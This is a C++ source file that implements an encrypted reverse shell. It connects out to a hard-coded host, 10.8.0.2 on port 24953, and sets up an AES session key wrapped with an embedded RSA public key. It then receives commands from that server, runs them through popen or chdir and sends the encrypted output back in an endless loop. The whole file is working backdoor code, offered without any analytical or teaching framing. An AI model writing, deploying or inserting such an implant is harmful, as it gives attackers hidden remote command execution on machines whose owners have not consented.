#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/dir.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include <cryptopp/rsa.h>
#include <cryptopp/sha.h>
#include <cryptopp/filters.h>
#include <cryptopp/osrng.h>
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>

#include "base64.h"

using std::string;
using namespace CryptoPP;

const int max = 10000;
const char *serverPublicKey =
        "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA6dc8DeNA4iuOnASTRdcr"
        "jYpokUgc65NIJ9uMem2gfxYK5v9ZP7JDlL2My4zLN9fyhPcQOnDNdKrkkqLC/Cv1"
        "eEJB9YF677zIh8SL2d4goOWEuLs70iQdNKLQM3Pyw9d6f8GJ3dAUz6fRo/5k9Uhb"
        "fFegUBf3HJXSQ3FfxJcwchsrg+858aVFeLvrjqAPLgSHT6NnfI0P7F1kFFymsQTK"
        "FGpd2BXj+efptiEfBRfRzr/vXsZJ3c36rI3qaQQs0qBRgrew+S8li2565D1bfMvY"
        "JLOuTH55YNNyCzgGR1NinyDdZp/dPJ0EcpKPbH5Mcer+k7JA0dNHTKt/GLxzU+bm"
        "bwkmOE3SsGvdkvB4CP1HoolIOmBvnQOPekH3cwrIuMLXR9KWQZj+8CYuWts7+NIC"
        "1gdgocAoYEaF5J3J+1Lqt5+jbsgM4Hm1m7c8FbCjIVc9NAKWZbEK0uuXqvMj/VDJ"
        "abJzIi3GGu3irreHFqIcTbpW9twCFii8wqIJ+W2TEpBEhWyD6+3LIWsuYzMmbC5V"
        "KjoqHHGcQr6MFDcwgZK0OszM8vjw+Il66soH2JS6z8d5kT1AIg8xrAX+QoFh3hpJ"
        "aSQqPnX3bRxrZKhcFdonifghV5lgRJ5PYjYMvEpVH01+jvUAdiha09ooe0j+gYWl"
        "Qgj1wnN7XqBqhg3/PrzOXk0CAwEAAQ==}";

RSA::PublicKey *serverPub;

RSAES_OAEP_SHA_Encryptor *encryptor;

CFB_Mode<AES>::Encryption *cfbEncryption;
CFB_Mode<AES>::Decryption *cfbDecryption;

AutoSeededRandomPool rng;

char *buf;
int mainSocket;

void clearBuf() {
    for (int i = 0; i <= max; i++)
        buf[i] = 0;
}

string encryptRSA(string text) {
    string res;
    StringSource(text, true,
        new PK_EncryptorFilter(rng, *encryptor,
            new StringSink(res)));

    return res;
}

void initRSA() {
    string pubkey = base64_decode(string(serverPublicKey));
    ByteQueue tmp;
    for (int i = 0; i < pubkey.size(); i++)
        tmp.Put((byte)pubkey[i]);

    serverPub = new RSA::PublicKey;
    serverPub->Load(tmp);

    encryptor = new RSAES_OAEP_SHA_Encryptor(*serverPub);
}

void initAES() {
    SecByteBlock key(0x00, AES::DEFAULT_KEYLENGTH);
    rng.GenerateBlock(key, key.size());

    byte initVector[AES::BLOCKSIZE];
    rng.GenerateBlock(initVector, AES::BLOCKSIZE);

    printf("sending aes... ");

    string aesInform;
    for (int i = 0; i < AES::DEFAULT_KEYLENGTH; i++)
        aesInform.push_back(*(key.BytePtr() + i));

    for (int i = 0; i < AES::BLOCKSIZE; i++)
        aesInform.push_back(initVector[i]);

    aesInform = encryptRSA(aesInform);
    aesInform = base64_encode((unsigned char*)(aesInform.c_str()), aesInform.size());

    send(mainSocket, aesInform.c_str(), aesInform.size(), 0);

    printf("sended\n");

    cfbEncryption = new CFB_Mode<AES>::Encryption(key, key.size(), initVector);
    cfbDecryption = new CFB_Mode<AES>::Decryption(key, key.size(), initVector);
}

void sendEncrypted(const byte *message, int len) {
    byte buf[len];
    cfbEncryption->ProcessData(buf, message, len);
    string s = base64_encode(buf, len);
    s.push_back('\n');
    send(mainSocket, s.c_str(), s.length(), 0);
}

void sendEncrypted(const char *message, int len) {
    sendEncrypted((const byte*)message, len);
}

void recvDecrypted() {
    recv(mainSocket, buf, max, 0);
    string half = base64_decode(string((char*)buf));
    cfbDecryption->ProcessData((byte*)buf, (byte*)half.c_str(), half.size());
    buf[half.size()] = 0;
}

void initNET() {
    mainSocket = socket(AF_INET, SOCK_STREAM, 0);
    buf = (char *)malloc(max + 2) + 1;

    sockaddr addr;
    addr.sa_family = AF_INET;
    *((unsigned short*)&addr + 1) = htons(24953);
    *((int*)&addr + 1) = htonl(inet_network("10.8.0.2"));

    connect(mainSocket, &addr, sizeof(addr));
}

int main() {
    initRSA();
    initNET();
    initAES();

    while (true) {
        clearBuf();

        recvDecrypted();

        if (buf[0] == 'c' && buf[1] == 'd' && buf[2] == ' ') {
            chdir(buf + 3);
            getcwd(buf, max);
            buf[-1] = 'D';
            sendEncrypted(buf - 1, strlen(buf) + 1);
        } else {
            FILE *out = popen(buf, "r");

            if (out == NULL) {
                sendEncrypted("not found", 10);
                continue;
            }

            buf[-1] = 'O';
            while (fgets(buf, max, out) != NULL)
                sendEncrypted(buf - 1, strlen(buf) + 1);

            fclose(out);
            buf[-1] = 'E';
            sendEncrypted(buf - 1, 1);
        }
    }

    return 0;
}
